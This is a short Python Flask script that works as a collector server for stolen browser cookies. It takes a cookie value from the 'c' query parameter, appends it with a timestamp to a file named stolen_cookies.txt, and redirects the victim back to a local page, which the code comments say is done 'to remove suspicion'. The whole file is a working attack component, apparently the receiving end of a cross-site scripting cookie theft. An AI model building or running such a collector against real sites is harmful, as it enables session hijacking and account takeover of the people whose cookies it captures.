from flask import Flask, request, redirect
from datetime import datetime

app = Flask(__name__)

@app.route('/')
def cookie():

    #Get the c argument
    cookie = request.args.get('c')

    #Write the cookie value to a file
    with open('stolen_cookies.txt', "a") as file:
        file.write(f"{datetime.now()}: {cookie}\n")

    #Redirect the users back to the original page to remove suspicion
    return redirect("http://localhost:5000")


#Run the application at a different port
if __name__ == '__main__':
    app.run(port=1000)